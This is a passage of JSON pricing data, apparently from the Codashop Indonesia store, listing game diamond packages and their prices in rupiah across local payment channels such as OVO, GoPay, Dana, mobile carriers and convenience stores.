Indonesia","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/HUTCH_THREE_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1495,"voucherDenominationId":214,"pricePointPaymentChannel":{"id":400,"name":"CARD_PAYMENT","displayName":"Kartu Kredit","displayName2":"Card Payment ID","isMno":false,"sortOrder":26,"countryCode":360,"tagline":"Bayar dengan kartu kredit","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/Card_Payment_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":150000.0,"channelVariablePrice":false,"displayPrice":"Rp. 150.000","deal":false},{"id":29279,"voucherDenominationId":214,"pricePointPaymentChannel":{"id":234,"name":"LINKAJA_ID","displayName":"LinkAja","displayName2":"LinkAja","isMno":false,"sortOrder":12,"countryCode":360,"tagline":"Bayar dengan LinkAja","tutorialType":2,"tutorialURL":"  https://cdn1.codashop.com/S/content/common/images/mno/linkaja_tutorial.jpg","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/LINKAJA_ID_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":4160,"voucherDenominationId":214,"pricePointPaymentChannel":{"id":227,"name":"GO_PAY","displayName":"GoPay","displayName2":"GoPay","isMno":false,"sortOrder":0,"countryCode":360,"tagline":"Bayar dengan CodaPay (Diskon 100%)","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/GO_PAY_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":150000.0,"channelVariablePrice":false,"displayPrice":"Rp. 150.000","deal":false},{"id":11498,"voucherDenominationId":214,"pricePointPaymentChannel":{"id":229,"name":"KREDIVO","displayName":"Kredivo","displayName2":"Kredivo (Indonesia)","isMno":false,"sortOrder":14,"countryCode":360,"tagline":"Cicilan Tanpa Kartu Kredit","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/KREDIVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":150000.0,"channelVariablePrice":false,"displayPrice":"Rp. 150.000","deal":false},{"id":1499,"voucherDenominationId":214,"pricePointPaymentChannel":{"id":24,"name":"TELKOMSEL","displayName":"Telkomsel","displayName2":"Telkomsel","isMno":true,"sortOrder":3,"countryCode":360,"tagline":"Beli pakai pulsa Telkomsel","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/TELKOMSEL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1502,"voucherDenominationId":214,"pricePointPaymentChannel":{"id":223,"name":"DOKU_WALLET","displayName":"DOKU Wallet","displayName2":"DOKU Wallet","isMno":false,"sortOrder":30,"countryCode":360,"tagline":"Bayar dengan DOKU Wallet","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_WALLET_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":150000.0,"channelVariablePrice":false,"displayPrice":"Rp. 150.000","deal":false},{"id":1494,"voucherDenominationId":214,"pricePointPaymentChannel":{"id":221,"name":"DOKU_OTC","displayName":"Alfamart","displayName2":"Alfamart","isMno":false,"sortOrder":18,"countryCode":360,"tagline":"Bayar di Alfamart","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_OTC_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":150000.0,"channelVariablePrice":false,"displayPrice":"Rp. 150.000","deal":false},{"id":1497,"voucherDenominationId":214,"pricePointPaymentChannel":{"id":22,"name":"INDOSAT","displayName":"Indosat","displayName2":"Indosat","isMno":true,"sortOrder":5,"countryCode":360,"tagline":"Beli pakai pulsa Indosat","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/INDOSAT_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":20364,"voucherDenominationId":214,"pricePointPaymentChannel":{"id":230,"name":"OVO","displayName":"OVO","displayName2":"OVO","isMno":false,"sortOrder":1,"countryCode":360,"tagline":"Bayar dengan OVO","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/OVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":142500.0,"channelVariablePrice":false,"displayPrice":"Rp. 142.500","deal":true},{"id":2872,"voucherDenominationId":214,"pricePointPaymentChannel":{"id":226,"name":"Indomaret","displayName":"Indomaret","displayName2":"Indomaret","isMno":false,"sortOrder":22,"countryCode":360,"tagline":"Bayar di Indomaret","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/Indomaret_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":157500.0,"channelVariablePrice":false,"displayPrice":"Rp. 157.500","deal":false},{"id":1493,"voucherDenominationId":214,"pricePointPaymentChannel":{"id":220,"name":"DOKU_ATM","displayName":"Bank Transfer","displayName2":"Bank Transfer Indonesia","isMno":false,"sortOrder":2,"countryCode":360,"tagline":"Bayar melalui ATM atau transfer Mobile Banking","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_ATM_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":142500.0,"channelVariablePrice":false,"displayPrice":"Rp. 142.500","deal":true},{"id":1503,"voucherDenominationId":214,"pricePointPaymentChannel":{"id":200,"name":"BITX_IDN","displayName":"Bitcoin","displayName2":"BitX IND","isMno":false,"sortOrder":42,"countryCode":360,"tagline":"Bayar dengan Bitcoin","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/BITX_IDN_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false}],"_status":1,"variableDenominationVoucher":false},{"displayPrice":"875 Diamonds","id":3722,"sellerId":50,"voucherId":"diamond_codashopIDR_230000","skuHashId":-1624509378,"sortOrderId":14,"voucherPricePoints":[{"id":27676,"voucherDenominationId":3722,"pricePointPaymentChannel":{"id":240,"name":"DANA","displayName":"Dana","displayName2":"Dana","isMno":false,"sortOrder":11,"countryCode":360,"tagline":"Bayar dengan Dana","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/DANA_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":218500.0,"channelVariablePrice":false,"displayPrice":"Rp. 218.500","deal":true},{"id":27680,"voucherDenominationId":3722,"pricePointPaymentChannel":{"id":400,"name":"CARD_PAYMENT","displayName":"Kartu Kredit","displayName2":"Card Payment ID","isMno":false,"sortOrder":26,"countryCode":360,"tagline":"Bayar dengan kartu kredit","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/Card_Payment_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":230000.0,"channelVariablePrice":false,"displayPrice":"Rp. 230.000","deal":false},{"id":27674,"voucherDenominationId":3722,"pricePointPaymentChannel":{"id":23,"name":"XL","displayName":"XL Axiata","displayName2":"XL Axiata","isMno":true,"sortOrder":9,"countryCode":360,"tagline":"Beli pakai pulsa XL","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/XL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":300000.0,"channelVariablePrice":false,"displayPrice":"Rp. 300.000","deal":false},{"id":27675,"voucherDenominationId":3722,"pricePointPaymentChannel":{"id":230,"name":"OVO","displayName":"OVO","displayName2":"OVO","isMno":false,"sortOrder":1,"countryCode":360,"tagline":"Bayar dengan OVO","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/OVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":218500.0,"channelVariablePrice":false,"displayPrice":"Rp. 218.500","deal":true},{"id":27671,"voucherDenominationId":3722,"pricePointPaymentChannel":{"id":24,"name":"TELKOMSEL","displayName":"Telkomsel","displayName2":"Telkomsel","isMno":true,"sortOrder":3,"countryCode":360,"tagline":"Beli pakai pulsa Telkomsel","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/TELKOMSEL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":300000.0,"channelVariablePrice":false,"displayPrice":"Rp. 300.000","deal":false},{"id":29280,"voucherDenominationId":3722,"pricePointPaymentChannel":{"id":234,"name":"LINKAJA_ID","displayName":"LinkAja","displayName2":"LinkAja","isMno":false,"sortOrder":12,"countryCode":360,"tagline":"Bayar dengan LinkAja","tutorialType":2,"tutorialURL":"  https://cdn1.codashop.com/S/content/common/images/mno/linkaja_tutorial.jpg","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/LINKAJA_ID_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":27673,"voucherDenominationId":3722,"pricePointPaymentChannel":{"id":26,"name":"HUTCH_THREE","displayName":"Tri Indonesia","displayName2":"Tri Indonesia","isMno":true,"sortOrder":7,"countryCode":360,"tagline":"Beli pakai pulsa Tri Indonesia","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/HUTCH_THREE_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":300000.0,"channelVariablePrice":false,"displayPrice":"Rp. 300.000","deal":false},{"id":27670,"voucherDenominationId":3722,"pricePointPaymentChannel":{"id":220,"name":"DOKU_ATM","displayName":"Bank Transfer","displayName2":"Bank Transfer Indonesia","isMno":false,"sortOrder":2,"countryCode":360,"tagline":"Bayar melalui ATM atau transfer Mobile Banking","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_ATM_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":218500.0,"channelVariablePrice":false,"displayPrice":"Rp. 218.500","deal":true},{"id":27678,"voucherDenominationId":3722,"pricePointPaymentChannel":{"id":221,"name":"DOKU_OTC","displayName":"Alfamart","displayName2":"Alfamart","isMno":false,"sortOrder":18,"countryCode":360,"tagline":"Bayar di Alfamart","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_OTC_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":230000.0,"channelVariablePrice":false,"displayPrice":"Rp. 230.000","deal":false},{"id":27672,"voucherDenominationId":3722,"pricePointPaymentChannel":{"id":22,"name":"INDOSAT","displayName":"Indosat","displayName2":"Indosat","isMno":true,"sortOrder":5,"countryCode":360,"tagline":"Beli pakai pulsa Indosat","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/INDOSAT_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":300000.0,"channelVariablePrice":false,"displayPrice":"Rp. 300.000","deal":false},{"id":27682,"voucherDenominationId":3722,"pricePointPaymentChannel":{"id":228,"name":"TRUE_MONEY_AGENT_NETWORK","displayName":"TrueMoney","displayName2":"TMAN (Indonesia)","isMno":false,"sortOrder":50,"countryCode":360,"tagline":"Bayar di TrueMoney Agent","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/TRUE_MONEY_AGENT_NETWORK_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":230000.0,"channelVariablePrice":false,"displayPrice":"Rp. 230.000","deal":false},{"id":27669,"voucherDenominationId":3722,"pricePointPaymentChannel":{"id":227,"name":"GO_PAY","displayName":"GoPay","displayName2":"GoPay","isMno":false,"sortOrder":0,"countryCode":360,"tagline":"Bayar dengan CodaPay (Diskon 100%)","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/GO_PAY_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":230000.0,"channelVariablePrice":false,"displayPrice":"Rp. 230.000","deal":false},{"id":27681,"voucherDenominationId":3722,"pricePointPaymentChannel":{"id":223,"name":"DOKU_WALLET","displayName":"DOKU Wallet","displayName2":"DOKU Wallet","isMno":false,"sortOrder":30,"countryCode":360,"tagline":"Bayar dengan DOKU Wallet","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_WALLET_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":230000.0,"channelVariablePrice":false,"displayPrice":"Rp. 230.000","deal":false},{"id":27677,"voucherDenominationId":3722,"pricePointPaymentChannel":{"id":229,"name":"KREDIVO","displayName":"Kredivo","displayName2":"Kredivo (Indonesia)","isMno":false,"sortOrder":14,"countryCode":360,"tagline":"Cicilan Tanpa Kartu Kredit","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/KREDIVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":230000.0,"channelVariablePrice":false,"displayPrice":"Rp. 230.000","deal":false},{"id":27679,"voucherDenominationId":3722,"pricePointPaymentChannel":{"id":226,"name":"Indomaret","displayName":"Indomaret","displayName2":"Indomaret","isMno":false,"sortOrder":22,"countryCode":360,"tagline":"Bayar di Indomaret","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/Indomaret_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":241500.0,"channelVariablePrice":false,"displayPrice":"Rp. 241.500","deal":false}],"_status":1,"variableDenominationVoucher":false},{"displayPrice":"2010 Diamonds","id":3723,"sellerId":50,"voucherId":"diamond_codashopIDR_500000","skuHashId":-1624509378,"sortOrderId":15,"voucherPricePoints":[{"id":27691,"voucherDenominationId":3723,"pricePointPaymentChannel":{"id":229,"name":"KREDIVO","displayName":"Kredivo","displayName2":"Kredivo (Indonesia)","isMno":false,"sortOrder":14,"countryCode":360,"tagline":"Cicilan Tanpa Kartu Kredit","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/KREDIVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":500000.0,"channelVariablePrice":false,"displayPrice":"Rp. 500.000","deal":false},{"id":27686,"voucherDenominationId":3723,"pricePointPaymentChannel":{"id":22,"name":"INDOSAT","displayName":"Indosat","displayName2":"Indosat","isMno":true,"sortOrder":5,"countryCode":360,"tagline":"Beli pakai pulsa Indosat","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/INDOSAT_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":27684,"voucherDenominationId":3723,"pricePointPaymentChannel":{"id":220,"name":"DOKU_ATM","displayName":"Bank Transfer","displayName2":"Bank Transfer Indonesia","isMno":false,"sortOrder":2,"countryCode":360,"tagline":"Bayar melalui ATM atau transfer Mobile Banking","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_ATM_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":475000.0,"channelVariablePrice":false,"displayPrice":"Rp. 475.000","deal":true},{"id":27692,"voucherDenominationId":3723,"pricePointPaymentChannel":{"id":221,"name":"DOKU_OTC","displayName":"Alfamart","displayName2":"Alfamart","isMno":false,"sortOrder":18,"countryCode":360,"tagline":"Bayar di Alfamart","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_OTC_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":500000.0,"channelVariablePrice":false,"displayPrice":"Rp. 500.000","deal":false},{"id":27688,"voucherDenominationId":3723,"pricePointPaymentChannel":{"id":23,"name":"XL","displayName":"XL Axiata","displayName2":"XL Axiata","isMno":true,"sortOrder":9,"countryCode":360,"tagline":"Beli pakai pulsa XL","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/XL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":29281,"voucherDenominationId":3723,"pricePointPaymentChannel":{"id":234,"name":"LINKAJA_ID","displayName":"LinkAja","displayName2":"LinkAja","isMno":false,"sortOrder":12,"countryCode":360,"tagline":"Bayar dengan LinkAja","tutorialType":2,"tutorialURL":"  https://cdn1.codashop.com/S/content/common/images/mno/linkaja_tutorial.jpg","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/LINKAJA_ID_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":27696,"voucherDenominationId":3723,"pricePointPaymentChannel":{"id":228,"name":"TRUE_MONEY_AGENT_NETWORK","displayName":"TrueMoney","displayName2":"TMAN (Indonesia)","isMno":false,"sortOrder":50,"countryCode":360,"tagline":"Bayar di TrueMoney Agent","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/TRUE_MONEY_AGENT_NETWORK_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":500000.0,"channelVariablePrice":false,"displayPrice":"Rp. 500.000","deal":false},{"id":27683,"voucherDenominationId":3723,"pricePointPaymentChannel":{"id":227,"name":"GO_PAY","displayName":"GoPay","displayName2":"GoPay","isMno":false,"sortOrder":0,"countryCode":360,"tagline":"Bayar dengan CodaPay (Diskon 100%)","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/GO_PAY_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":500000.0,"channelVariablePrice":false,"displayPrice":"Rp. 500.000","deal":false},{"id":27690,"voucherDenominationId":3723,"pricePointPaymentChannel":{"id":240,"name":"DANA","displayName":"Dana","displayName2":"Dana","isMno":false,"sortOrder":11,"countryCode":360,"tagline":"Bayar dengan Dana","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/DANA_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":475000.0,"channelVariablePrice":false,"displayPrice":"Rp. 475.000","deal":true},{"id":27695,"voucherDenominationId":3723,"pricePointPaymentChannel":{"id":223,"name":"DOKU_WALLET","displayName":"DOKU Wallet","displayName2":"DOKU Wallet","isMno":false,"sortOrder":30,"countryCode":360,"tagline":"Bayar dengan DOKU Wallet","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_WALLET_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":500000.0,"channelVariablePrice":false,"displayPrice":"Rp. 500.000","deal":false},{"id":27689,"voucherDenominationId":3723,"pricePointPaymentChannel":{"id":230,"name":"OVO","displayName":"OVO","displayName2":"OVO","isMno":false,"sortOrder":1,"countryCode":360,"tagline":"Bayar dengan OVO","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/OVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":475000.0,"channelVariablePrice":false,"displayPrice":"Rp. 475.000","deal":true},{"id":27685,"voucherDenominationId":3723,"pricePointPaymentChannel":{"id":24,"name":"TELKOMSEL","displayName":"Telkomsel","displayName2":"Telkomsel","isMno":true,"sortOrder":3,"countryCode":360,"tagline":"Beli pakai pulsa Telkomsel","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/TELKOMSEL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":27693,"voucherDenominationId":3723,"pricePointPaymentChannel":{"id":226,"name":"Indomaret","displayName":"Indomaret","displayName2":"Indomaret","isMno":false,"sortOrder":22,"countryCode":360,"tagline":"Bayar di Indomaret","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/Indomaret_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":525000.0,"channelVariablePrice":false,"displayPrice":"Rp. 525.000","deal":false},{"id":27687,"voucherDenominationId":3723,"pricePointPaymentChannel":{"id":26,"name":"HUTCH_THREE","displayName":"Tri Indonesia","displayName2":"Tri Indonesia","isMno":true,"sortOrder":7,"countryCode":360,"tagline":"Beli pakai pulsa Tri Indonesia","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/HUTCH_THREE_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":27694,"voucherDenominationId":3723,"pricePointPaymentChannel":{"id":400,"name":"CARD_PAYMENT","displayName":"Kartu Kredit","displayName2":"Card Payment ID","isMno":false,"sortOrder":26,"countryCode":360,"tagline":"Bayar dengan kartu kredit","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/Card_Payment_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":500000.0,"channelVariablePrice":false,"displayPrice":"Rp. 500.000","deal":false}],"_status":1,"variableDenominationVoucher":false},{"displayPrice":"4830 Diamonds","id":3724,"sellerId":50,"voucherId":"diamond_codashopIDR_1200000","skuHashId":-1624509378,"sortOrderId":16,"voucherPricePoints":[{"id":27701,"voucherDenominationId":3724,"pricePointPaymentChannel":{"id":26,"name":"HUTCH_THREE","displayName":"Tri Indonesia","displayName2":"Tri Indonesia","isMno":true,"sortOrder":7,"countryCode":360,"tagline":"Beli pakai pulsa Tri Indonesia","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/HUTCH_THREE_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":27710,"voucherDenominationId":3724,"pricePointPaymentChannel":{"id":228,"name":"TRUE_MONEY_AGENT_NETWORK","displayName":"TrueMoney","displayName2":"TMAN (Indonesia)","isMno":false,"sortOrder":50,"countryCode":360,"tagline":"Bayar di TrueMoney Agent","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/TRUE_MONEY_AGENT_NETWORK_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":1200000.0,"channelVariablePrice":false,"displayPrice":"Rp. 1.200.000","deal":false},{"id":27697,"voucherDenominationId":3724,"pricePointPaymentChannel":{"id":227,"name":"GO_PAY","displayName":"GoPay","displayName2":"GoPay","isMno":false,"sortOrder":0,"countryCode":360,"tagline":"Bayar dengan CodaPay (Diskon 100%)","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/GO_PAY_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":1200000.0,"channelVariablePrice":false,"displayPrice":"Rp. 1.200.000","deal":false},{"id":27709,"voucherDenominationId":3724,"pricePointPaymentChannel":{"id":223,"name":"DOKU_WALLET","displayName":"DOKU Wallet","displayName2":"DOKU Wallet","isMno":false,"sortOrder":30,"countryCode":360,"tagline":"Bayar dengan DOKU Wallet","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_WALLET_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":1200000.0,"channelVariablePrice":false,"displayPrice":"Rp. 1.200.000","deal":false},{"id":27704,"voucherDenominationId":3724,"pricePointPaymentChannel":{"id":240,"name":"DANA","displayName":"Dana","displayName2":"Dana","isMno":false,"sortOrder":11,"countryCode":360,"tagline":"Bayar dengan Dana","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/DANA_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":1140000.0,"channelVariablePrice":false,"displayPrice":"Rp. 1.140.000","deal":true},{"id":27699,"voucherDenominationId":3724,"pricePointPaymentChannel":{"id":24,"name":"TELKOMSEL","displayName":"Telkomsel","displayName2":"Telkomsel","isMno":true,"sortOrder":3,"countryCode":360,"tagline":"Beli pakai pulsa Telkomsel","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/TELKOMSEL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":27707,"voucherDenominationId":3724,"pricePointPaymentChannel":{"id":226,"name":"Indomaret","displayName":"Indomaret","displayName2":"Indomaret","isMno":false,"sortOrder":22,"countryCode":360,"tagline":"Bayar di Indomaret","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/Indomaret_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":1260000.0,"channelVariablePrice":false,"displayPrice":"Rp. 1.260.000","deal":false},{"id":27706,"voucherDenominationId":3724,"pricePointPaymentChannel":{"id":221,"name":"DOKU_OTC","displayName":"Alfamart","displayName2":"Alfamart","isMno":false,"sortOrder":18,"countryCode":360,"tagline":"Bayar di Alfamart","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_OTC_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":1200000.0,"channelVariablePrice":false,"displayPrice":"Rp. 1.200.000","deal":false},{"id":27698,"voucherDenominationId":3724,"pricePointPaymentChannel":{"id":220,"name":"DOKU_ATM","displayName":"Bank Transfer","displayName2":"Bank Transfer Indonesia","isMno":false,"sortOrder":2,"countryCode":360,"tagline":"Bayar melalui ATM atau transfer Mobile Banking","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_ATM_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":1140000.0,"channelVariablePrice":false,"displayPrice":"Rp. 1.140.000","deal":true},{"id":27703,"voucherDenominationId":3724,"pricePointPaymentChannel":{"id":230,"name":"OVO","displayName":"OVO","displayName2":"OVO","isMno":false,"sortOrder":1,"countryCode":360,"tagline":"Bayar dengan OVO","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/OVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":1140000.0,"channelVariablePrice":false,"displayPrice":"Rp. 1.140.000","deal":true},{"id":27700,"voucherDenominationId":3724,"pricePointPaymentChannel":{"id":22,"name":"INDOSAT","displayName":"Indosat","displayName2":"Indosat","isMno":true,"sortOrder":5,"countryCode":360,"tagline":"Beli pakai pulsa Indosat","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/INDOSAT_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":27705,"voucherDenominationId":3724,"pricePointPaymentChannel":{"id":229,"name":"KREDIVO","displayName":"Kredivo","displayName2":"Kredivo (Indonesia)","isMno":false,"sortOrder":14,"countryCode":360,"tagline":"Cicilan Tanpa Kartu Kredit","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/KREDIVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":1200000.0,"channelVariablePrice":false,"displayPrice":"Rp. 1.200.000","deal":false},{"id":29282,"voucherDenominationId":3724,"pricePointPaymentChannel":{"id":234,"name":"LINKAJA_ID","displayName":"LinkAja","displayName2":"LinkAja","isMno":false,"sortOrder":12,"countryCode":360,"tagline":"Bayar dengan LinkAja","tutorialType":2,"tutorialURL":"  https://cdn1.codashop.com/S/content/common/images/mno/linkaja_tutorial.jpg","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/LINKAJA_ID_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":27708,"voucherDenominationId":3724,"pricePointPaymentChannel":{"id":400,"name":"CARD_PAYMENT","displayName":"Kartu Kredit","displayName2":"Card Payment ID","isMno":false,"sortOrder":26,"countryCode":360,"tagline":"Bayar dengan kartu 